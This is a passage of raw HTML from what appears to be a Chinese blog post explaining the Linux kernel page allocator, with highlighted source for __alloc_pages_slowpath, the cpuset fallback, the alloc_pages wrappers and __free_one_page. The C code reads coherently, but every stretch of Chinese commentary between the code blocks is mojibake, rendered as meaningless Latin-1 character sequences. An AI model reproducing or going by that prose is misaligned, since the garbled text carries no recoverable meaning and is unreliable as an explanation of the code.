class="keyword">goto</span> nopage;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Avoid recursion of direct reclaim */</span></span><br><span class="line"><span class="keyword">if</span> (current-&gt;flags &amp; PF_MEMALLOC)</span><br><span class="line"><span class="keyword">goto</span> nopage;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Try direct reclaim and then allocating */</span></span><br><span class="line">page = __alloc_pages_direct_reclaim(gfp_mask, order, alloc_flags, ac,</span><br><span class="line">&amp;did_some_progress);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> got_pg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Try direct compaction and then allocating */</span></span><br><span class="line">page = __alloc_pages_direct_compact(gfp_mask, order, alloc_flags, ac,</span><br><span class="line">compact_priority, &amp;compact_result);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> got_pg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Do not loop if specifically requested */</span></span><br><span class="line"><span class="keyword">if</span> (gfp_mask &amp; __GFP_NORETRY)</span><br><span class="line"><span class="keyword">goto</span> nopage;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Do not retry costly high order allocations unless they are</span></span><br><span class="line"><span class="comment"> * __GFP_RETRY_MAYFAIL</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (costly_order &amp;&amp; !(gfp_mask &amp; __GFP_RETRY_MAYFAIL))</span><br><span class="line"><span class="keyword">goto</span> nopage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (should_reclaim_retry(gfp_mask, order, ac, alloc_flags,</span><br><span class="line"> did_some_progress &gt; <span class="number">0</span>, &amp;no_progress_loops))</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * It doesn&#x27;t make any sense to retry for the compaction if the order-0</span></span><br><span class="line"><span class="comment"> * reclaim is not able to make any progress because the current</span></span><br><span class="line"><span class="comment"> * implementation of the compaction depends on the sufficient amount</span></span><br><span class="line"><span class="comment"> * of free memory (see __compaction_suitable)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (did_some_progress &gt; <span class="number">0</span> &amp;&amp;</span><br><span class="line">should_compact_retry(ac, order, alloc_flags,</span><br><span class="line">compact_result, &amp;compact_priority,</span><br><span class="line">&amp;compaction_retries))</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Deal with possible cpuset update races or zonelist updates to avoid</span></span><br><span class="line"><span class="comment"> * a unnecessary OOM kill.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (check_retry_cpuset(cpuset_mems_cookie, ac) ||</span><br><span class="line">    check_retry_zonelist(zonelist_iter_cookie))</span><br><span class="line"><span class="keyword">goto</span> restart;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Reclaim has failed us, start killing things */</span></span><br><span class="line">page = __alloc_pages_may_oom(gfp_mask, order, ac, &amp;did_some_progress);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> got_pg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Avoid allocations with no watermarks from looping endlessly */</span></span><br><span class="line"><span class="keyword">if</span> (tsk_is_oom_victim(current) &amp;&amp;</span><br><span class="line">    (alloc_flags &amp; ALLOC_OOM ||</span><br><span class="line">     (gfp_mask &amp; __GFP_NOMEMALLOC)))</span><br><span class="line"><span class="keyword">goto</span> nopage;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Retry as long as the OOM killer is making progress */</span></span><br><span class="line"><span class="keyword">if</span> (did_some_progress) &#123;</span><br><span class="line">no_progress_loops = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nopage:</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Deal with possible cpuset update races or zonelist updates to avoid</span></span><br><span class="line"><span class="comment"> * a unnecessary OOM kill.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (check_retry_cpuset(cpuset_mems_cookie, ac) ||</span><br><span class="line">    check_retry_zonelist(zonelist_iter_cookie))</span><br><span class="line"><span class="keyword">goto</span> restart;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Make sure that __GFP_NOFAIL request doesn&#x27;t leak out and make sure</span></span><br><span class="line"><span class="comment"> * we always retry</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (gfp_mask &amp; __GFP_NOFAIL) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * All existing users of the __GFP_NOFAIL are blockable, so warn</span></span><br><span class="line"><span class="comment"> * of any new users that actually require GFP_NOWAIT</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (WARN_ON_ONCE_GFP(!can_direct_reclaim, gfp_mask))</span><br><span class="line"><span class="keyword">goto</span> fail;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * PF_MEMALLOC request from this context is rather bizarre</span></span><br><span class="line"><span class="comment"> * because we cannot reclaim anything and only can loop waiting</span></span><br><span class="line"><span class="comment"> * for somebody to do a work for us</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">WARN_ON_ONCE_GFP(current-&gt;flags &amp; PF_MEMALLOC, gfp_mask);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * non failing costly orders are a hard requirement which we</span></span><br><span class="line"><span class="comment"> * are not prepared for much so let&#x27;s warn about these users</span></span><br><span class="line"><span class="comment"> * so that we can identify them and convert them to something</span></span><br><span class="line"><span class="comment"> * else.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">WARN_ON_ONCE_GFP(costly_order, gfp_mask);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Help non-failing allocations by giving some access to memory</span></span><br><span class="line"><span class="comment"> * reserves normally used for high priority non-blocking</span></span><br><span class="line"><span class="comment"> * allocations but do not use ALLOC_NO_WATERMARKS because this</span></span><br><span class="line"><span class="comment"> * could deplete whole memory reserves which would just make</span></span><br><span class="line"><span class="comment"> * the situation worse.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">page = __alloc_pages_cpuset_fallback(gfp_mask, order, ALLOC_MIN_RESERVE, ac);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> got_pg;</span><br><span class="line"></span><br><span class="line">cond_resched();</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line">&#125;</span><br><span class="line">fail:</span><br><span class="line">warn_alloc(gfp_mask, ac-&gt;nodemask,</span><br><span class="line"><span class="string">&quot;page allocation failure: order:%u&quot;</span>, order);</span><br><span class="line">got_pg:</span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›¸ä¿¡å„ä½éƒ½åœ¨æ“ä½œç³»ç»Ÿè¯¾ç¨‹ä¸Šå­¦ä¹ è¿‡é¡µè¿ç§»æœºåˆ¶ï¼Œåœ¨è¿™é‡Œä¹Ÿç®€å•è¯´ä¸€ä¸‹å†…æ ¸ä¸­çš„<code>Memory compaction</code>æœºåˆ¶ï¼Œå°±æ˜¯æ•´ç†å†…å­˜ç¢ç‰‡ï¼Œå¯¹é›¶æ•£çš„å†…å­˜é¡µè¿›è¡Œè¿ç§»ï¼Œä»è€Œå°†é›¶æ•£çš„ç©ºé—²å†…å­˜é¡µå˜æˆå¤§å—çš„ç©ºé—²å†…å­˜ï¼Œä¸è¿‡è¿™é‡Œåªæ•´ç†å¯ä»¥ç§»åŠ¨çš„ç¢ç‰‡ã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/q7T6EjtIb9PVFY3.png"                                     ></p><p>ç°åœ¨å¼€å§‹åˆ†æä¸€ä¸‹æ•´ä¸ªå‡½æ•°çš„æµç¨‹å§ï¼Œé¦–å…ˆä½¿ç”¨åŸæœ‰çš„ gfp_flag é‡æ–°è®¾ç½® alloc_flagï¼Œå¹¶é‡æ–°è®¡ç®—<code>preferred zone</code>ï¼Œè‹¥è®¾ç½®äº† <code>ALLOC_KSWAPD</code> åˆ™è°ƒç”¨ <code>wake_all_kswapds()</code> å”¤é†’ kswapd çº¿ç¨‹è¿›è¡Œå†…å­˜å›æ”¶ã€‚</p><p>éšåç›´æ¥é‡æ–°å°è¯•å¿«é€Ÿè·¯å¾„åˆ†é…ï¼Œå¦‚æœæˆåŠŸåˆ™ç›´æ¥è¿”å›ã€‚</p><p>æ¥ä¸‹æ¥è°ƒç”¨ <code>__alloc_pages_direct_compact()</code> è¿›è¡Œcompactionï¼Œè¯¥å‡½æ•°å†…éƒ¨åœ¨æ•´ç†å®Œåä¼šé‡æ–°å°è¯•å¿«é€Ÿè·¯å¾„çš„åˆ†é…ï¼Œè‹¥æˆåŠŸåˆ™ç›´æ¥è¿”å›ã€‚</p><p>éšåè¿›å…¥retryåˆ†æ”¯è°ƒç”¨ <code>wake_all_kswapds()</code> å”¤é†’ kswapd çº¿ç¨‹è¿›è¡Œå†…å­˜å›æ”¶ã€‚</p><p>è°ƒæ•´ zonelist ä¸<code>alloc_flag</code>ï¼Œä¹‹åå†æ¬¡å°è¯•å¿«é€Ÿè·¯å¾„åˆ†é…ï¼Œè‹¥æˆåŠŸåˆ™ç›´æ¥è¿”å›ã€‚</p><p>è‹¥ gfp_flag ä¸­æ²¡æœ‰ <code>__GFP_DIRECT_RECLAIM</code> æˆ–æ˜¯è¿›ç¨‹ PCB çš„ flag ä¸­æœ‰ <code>PF_MEMALLOC</code>ï¼Œç›´æ¥è·³è½¬åˆ°nopageåˆ†æ”¯ã€‚</p><p>éšåè°ƒç”¨ <code>__alloc_pages_direct_reclaim()</code> è¿›è¡Œå†…å­˜å›æ”¶ï¼ˆå†…éƒ¨è°ƒç”¨ <code>__perform_reclaim()</code>ï¼‰ä¸å¿«é€Ÿè·¯å¾„åˆ†é…ï¼Œè‹¥æˆåŠŸåˆ™ç›´æ¥è¿”å›ã€‚</p><p>ç„¶åè°ƒç”¨ <code>__alloc_pages_direct_compact()</code> è¿›è¡Œ compaction ä¸å¿«é€Ÿè·¯å¾„åˆ†é…ï¼Œè‹¥æˆåŠŸåˆ™ç›´æ¥è¿”å›ã€‚</p><p>å¦‚æœè®¾ç½®äº† <code>__GFP_NORETRY</code> ï¼Œæˆ–æ˜¯è¯¥æ¬¡å†…å­˜åˆ†é…å¼€é”€è¾ƒé«˜ï¼ˆ<code>order &gt; PAGE_ALLOC_COSTLY_ORDER</code>ï¼‰ä¸”æœªè®¾ç½® <code>__GFP_RETRY_MAYFAIL</code>ï¼Œç›´æ¥è·³åˆ°nopageæ ‡ç­¾ã€‚</p><p>è°ƒç”¨ <code>should_reclaim_retry()</code> åˆ¤æ–­æ˜¯å¦éœ€è¦é‡æ–°å›æ”¶ï¼Œè‹¥æ˜¯åˆ™è·³å›retryæ ‡ç­¾ã€‚</p><p>è°ƒç”¨ <code>should_compact_retry()</code> åˆ¤æ–­æ˜¯å¦éœ€è¦é‡æ–°è¿›è¡Œ compactionï¼Œè‹¥æ˜¯åˆ™è·³å›retryæ ‡ç­¾ã€‚</p><p>è°ƒç”¨ <code>check_retry_cpuset()</code> æ£€æŸ¥ cpuset æ˜¯å¦å‘ç”Ÿå˜åŒ–ï¼Œè‹¥æ˜¯åˆ™è·³è½¬å›å¼€å¤´å³restartæ ‡ç­¾ã€‚</p><p>åœ¨å‰é¢çš„æ£€æµ‹éƒ½æ²¡è·³è½¬åˆ™è°ƒç”¨ <code>__alloc_pages_may_oom()</code> å°è¯• kill ä¸€äº›è¿›ç¨‹æ¥é‡Šæ”¾å†…å­˜ï¼Œè¯¥å‡½æ•°å†…é¦–å…ˆè¿˜æ˜¯ä¼šå…ˆè¿›è¡Œä¸€æ¬¡å¿«é€Ÿåˆ†é…ï¼Œä¹‹åæ‰æ˜¯è°ƒç”¨ <code>out_of_memory()</code> æ¥æ€æ‰æœ€é€‚åˆçš„è¿›ç¨‹ä»¥é‡Šæ”¾å†…å­˜ï¼Œæœ€åè‹¥è®¾ç½®äº† <code>__GFP_NOFAIL</code> åˆ™è°ƒç”¨ <code>__alloc_pages_cpuset_fallback()</code> å†æ¬¡å°è¯•å†…å­˜åˆ†é…ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *</span></span><br><span class="line"><span class="class">__<span class="title">alloc_pages_cpuset_fallback</span>(<span class="title">gfp_t</span> <span class="title">gfp_mask</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">order</span>,</span></span><br><span class="line"><span class="class">      <span class="title">unsigned</span> <span class="title">int</span> <span class="title">alloc_flags</span>,</span></span><br><span class="line"><span class="class">      <span class="title">const</span> <span class="keyword">struct</span> <span class="title">alloc_context</span> *<span class="title">ac</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line">page = get_page_from_freelist(gfp_mask, order,</span><br><span class="line">alloc_flags|ALLOC_CPUSET, ac);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * fallback to ignore cpuset restriction if our nodes</span></span><br><span class="line"><span class="comment"> * are depleted</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!page)</span><br><span class="line">page = get_page_from_freelist(gfp_mask, order,</span><br><span class="line">alloc_flags, ac);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°ä¸­ä¼šä¸¤æ¬¡èµ°å¿«é€Ÿè·¯å¾„è¿›è¡Œåˆ†é…ï¼Œåœ¨ç¬¬ä¸€æ¬¡ä¼šé¢å¤–é™„åŠ ä¸Š <code>ALLOC_CPUSET</code> çš„ flagã€‚</p><p>ç»§ç»­çœ‹<code>__alloc_pages_slowpath</code>å‡½æ•°æµç¨‹ï¼Œå¦‚æœæŠŠå½“å‰è¿›ç¨‹æ€æ‰äº†ï¼Œè·³åˆ°nopageæ ‡ç­¾ï¼Œå¦‚æœæ€è¿›ç¨‹å–å¾—äº†æˆæ•ˆï¼Œè·³å›retryæ ‡ç­¾ã€‚</p><p>æœ€åè¿›å…¥nopageæ ‡ç­¾è°ƒç”¨ <code>check_retry_cpuset()</code> æ£€æŸ¥ cpuset æ˜¯å¦å‘ç”Ÿå˜åŒ–ï¼Œè‹¥æ˜¯åˆ™è·³è½¬å›å¼€å¤´å³restartæ ‡ç­¾ã€‚</p><p>è‹¥è®¾ç½®äº† <code>__GFP_NOFAIL</code> åˆ™è¿›è¡Œä¸€ç³»åˆ—çš„è­¦å‘Šï¼Œå¹¶è°ƒç”¨ <code>__alloc_pages_cpuset_fallback()</code> å†æ¬¡å°è¯•å†…å­˜åˆ†é…ï¼Œè‹¥æœªæˆåŠŸåˆ™è·³å›retryæ ‡ç­¾ã€‚æœ€åå°±æ˜¯è¿”å›ç»“æœäº†ã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/eCg12KJIZuw9aon.png"                                     ></p><p>ä¸Šé¢æ˜¯å·çš„å›¾ï¼Œå…¶å®é€šè¿‡å›¾èƒ½å¤Ÿæ›´æ¸…æ™°çš„ç†æ¸…æ¥šslow pathçš„é€»è¾‘ã€‚</p><h2 id="ä¸Šå±‚å°è£…çš„åˆ†é…å‡½æ•°"><a href="#ä¸Šå±‚å°è£…çš„åˆ†é…å‡½æ•°" class="headerlink" title="ä¸Šå±‚å°è£…çš„åˆ†é…å‡½æ•°"></a>ä¸Šå±‚å°è£…çš„åˆ†é…å‡½æ•°</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *</span></span><br><span class="line"><span class="class">__<span class="title">alloc_pages_node</span>(<span class="title">int</span> <span class="title">nid</span>, <span class="title">gfp_t</span> <span class="title">gfp_mask</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">order</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">VM_BUG_ON(nid &lt; <span class="number">0</span> || nid &gt;= MAX_NUMNODES);</span><br><span class="line">warn_if_node_offline(nid, gfp_mask);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> __alloc_pages(gfp_mask, order, nid, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct page *<span class="title">alloc_pages_node</span><span class="params">(<span class="keyword">int</span> nid, <span class="keyword">gfp_t</span> gfp_mask,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (nid == NUMA_NO_NODE)</span><br><span class="line">nid = numa_mem_id();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> __alloc_pages_node(nid, gfp_mask, order);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct page *<span class="title">alloc_pages</span><span class="params">(<span class="keyword">gfp_t</span> gfp_mask, <span class="keyword">unsigned</span> <span class="keyword">int</span> order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> alloc_pages_node(numa_node_id(), gfp_mask, order);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> __get_free_pages(<span class="keyword">gfp_t</span> gfp_mask, <span class="keyword">unsigned</span> <span class="keyword">int</span> order)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line">page = alloc_pages(gfp_mask &amp; ~__GFP_HIGHMEM, order);</span><br><span class="line"><span class="keyword">if</span> (!page)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page_address(page);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__get_free_pages);</span><br></pre></td></tr></table></figure><p>åœ¨<code>__alloc_pages</code>ä¸Šå±‚æœ‰è¿™æ ·ä¸€äº›åˆ†é…å‡½æ•°ï¼Œåªä¸è¿‡è¿”å›çš„å†…å®¹ä¸ä¸€æ ·ï¼Œåœ¨<code>__get_free_pages</code>å‡½æ•°è¿”å›çš„æ˜¯è™šæ‹Ÿåœ°å€ï¼Œ<code>alloc_pages</code>å‡½æ•°è¿”å›çš„æ˜¯<code>page</code>ç»“æ„ä½“æŒ‡é’ˆã€‚</p><h2 id="free-one-pageå‡½æ•°"><a href="#free-one-pageå‡½æ•°" class="headerlink" title="__free_one_pageå‡½æ•°"></a>__free_one_pageå‡½æ•°</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Freeing function for a buddy system allocator.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The concept of a buddy system is to maintain direct-mapped table</span></span><br><span class="line"><span class="comment"> * (containing bit values) for memory blocks of various &quot;orders&quot;.</span></span><br><span class="line"><span class="comment"> * The bottom level table contains the map for the smallest allocatable</span></span><br><span class="line"><span class="comment"> * units of memory (here, pages), and each level above it describes</span></span><br><span class="line"><span class="comment"> * pairs of units from the levels below, hence, &quot;buddies&quot;.</span></span><br><span class="line"><span class="comment"> * At a high level, all that happens here is marking the table entry</span></span><br><span class="line"><span class="comment"> * at the bottom level available, and propagating the changes upward</span></span><br><span class="line"><span class="comment"> * as necessary, plus some accounting needed to play nicely with other</span></span><br><span class="line"><span class="comment"> * parts of the VM system.</span></span><br><span class="line"><span class="comment"> * At each level, we keep a list of pages, which are heads of continuous</span></span><br><span class="line"><span class="comment"> * free pages of length of (1 &lt;&lt; order) and marked with PageBuddy.</span></span><br><span class="line"><span class="comment"> * Page&#x27;s order is recorded in page_private(page) field.</span></span><br><span class="line"><span class="comment"> * So when we are allocating or freeing one, we can derive the state of the</span></span><br><span class="line"><span class="comment"> * other.  That is, if we allocate a small block, and both were</span></span><br><span class="line"><span class="comment"> * free, the remainder of the region must be split into blocks.</span></span><br><span class="line"><span class="comment"> * If a block is freed, and its buddy is also free, then this</span></span><br><span class="line"><span class="comment"> * triggers coalescing into a block of larger size.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * -- nyc</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __free_one_page(struct page *page,</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pfn,</span><br><span class="line">struct zone *zone, <span class="keyword">unsigned</span> <span class="keyword">int</span> order,</span><br><span class="line"><span class="keyword">int</span> migratetype, <span class="keyword">fpi_t</span> fpi_flags)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">capture_control</span> *<span class="title">capc</span> =</span> task_capc(zone);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> buddy_pfn = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> combined_pfn;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">buddy</span>;</span></span><br><span class="line"><span class="keyword">bool</span> to_tail;</span><br><span class="line"></span><br><span class="line">VM_BUG_ON(!zone_is_initialized(zone));</span><br><span class="line">VM_BUG_ON_PAGE(page-&gt;flags &amp; PAGE_FLAGS_CHECK_AT_PREP, page);</span><br><span class="line"></span><br><span class="line">VM_BUG_ON(migratetype == <span class="number">-1</span>);</span><br><span class="line"><span class="keyword">if</span> (likely(!is_migrate_isolate(migratetype)))</span><br><span class="line">__mod_zone_freepage_state(zone, <span class="number">1</span> &lt;&lt; order, migratetype);</span><br><span class="line"></span><br><span class="line">VM_BUG_ON_PAGE(pfn &amp; ((<span class="number">1</span> &lt;&lt; order) - <span class="number">1</span>), page);</span><br><span class="line">VM_BUG_ON_PAGE(bad_range(zone, page), page);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (order &lt; MAX_ORDER) &#123;</span><br><span class="line"><span class="keyword">if</span> (compaction_capture(capc, page, order, migratetype)) &#123;</span><br><span class="line">__mod_zone_freepage_state(zone, -(<span class="number">1</span> &lt;&lt; order),</span><br><span class="line">migratetype);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">buddy = find_buddy_page_pfn(page, pfn, order, &amp;buddy_pfn);</span><br><span class="line"><span class="keyword">if</span> (!buddy)</span><br><span class="line"><span class="keyword">goto</span> done_merging;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(order &gt;= pageblock_order)) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We want to prevent merge between freepages on pageblock</span></span><br><span class="line"><span class="comment"> * without fallbacks and normal pageblock. Without this,</span></span><br><span class="line"><span class="comment"> * pageblock isolation could cause incorrect freepage or CMA</span></span><br><span class="line"><span class="comment"> * accounting or HIGHATOMIC accounting.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span> buddy_mt = get_pfnblock_migratetype(buddy, buddy_pfn);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (migratetype != buddy_mt</span><br><span class="line">&amp;&amp; (!migratetype_is_mergeable(migratetype) ||</span><br><span class="line">!migratetype_is_mergeable(buddy_mt)))</span><br><span class="line"><span class="keyword">goto</span> done_merging;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Our buddy is free or it is CONFIG_DEBUG_PAGEALLOC guard page,</span></span><br><span class="line"><span class="comment"> * merge with it and move up one order.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (page_is_guard(buddy))</span><br><span class="line">clear_page_guard(zone, buddy, order, migratetype);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">del_page_from_free_list(buddy, zone, order);</span><br><span class="line">combined_pfn = buddy_pfn &amp; pfn;</span><br><span class="line">page = page + (combined_pfn - pfn);</span><br><span class="line">pfn = combined_pfn;</span><br><span class="line">order++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">done_merging:</span><br><span class="line">set_buddy_order(page, order);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fpi_flags &amp; FPI_TO_TAIL)</span><br><span class="line">to_tail = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (is_shuffle_order(order))</span><br><span class="line">to_tail = shuffle_pick_tail();</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">to_tail = buddy_merge_likely(pfn, buddy_pfn, page, order);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (to_tail)</span><br><span class="line">add_to_free_list_tail(page, zone, order, migratetype);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">add_to_free_list(page, zone, order, migratetype);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Notify page reporting subsystem of freed page */</span></span><br><span class="line"><span class="keyword">if</span> (!(fpi_flags &amp; 